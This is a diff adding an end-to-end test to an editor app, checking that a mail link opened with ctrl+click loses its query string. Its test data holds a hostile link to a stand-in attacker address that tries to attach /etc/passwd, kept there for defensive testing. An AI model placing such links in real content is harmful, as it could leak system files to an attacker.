@@ -105,6 +105,24 @@ test("links show where they go and open with ctrl+click", async ({ page }) => {
   expect(await page.evaluate(() => window.openedUrls)).toHaveLength(1);
 });
 
+test("a mail link in a page opens without its query", async ({ page }) => {
+  await seedAndOpen(page, "Contacts", "Write to [Ops](MAILTO:ops@evil.example?attach=/etc/passwd) today");
+  await page.evaluate(() => {
+    window.openedUrls = [];
+    const answer = window.fake.handle.bind(window.fake);
+    window.fake.handle = (command, args) => {
+      if (command !== "plugin:opener|open_url") return answer(command, args);
+      if (args && "url" in args && typeof args.url === "string") window.openedUrls.push(args.url);
+      return null;
+    };
+  });
+  await page
+    .locator(".cm-content")
+    .getByText("Ops")
+    .click({ modifiers: ["ControlOrMeta"] });
+  await expect.poll(() => page.evaluate(() => window.openedUrls)).toEqual(["mailto:ops@evil.example"]);
+});
+
 test("page links show as chips with the page's current title", async ({ page }) => {
   await page.goto("");
   const roadmap = await page.evaluate(() => window.fake.seedPage("Roadmap", "Q1 plans"));
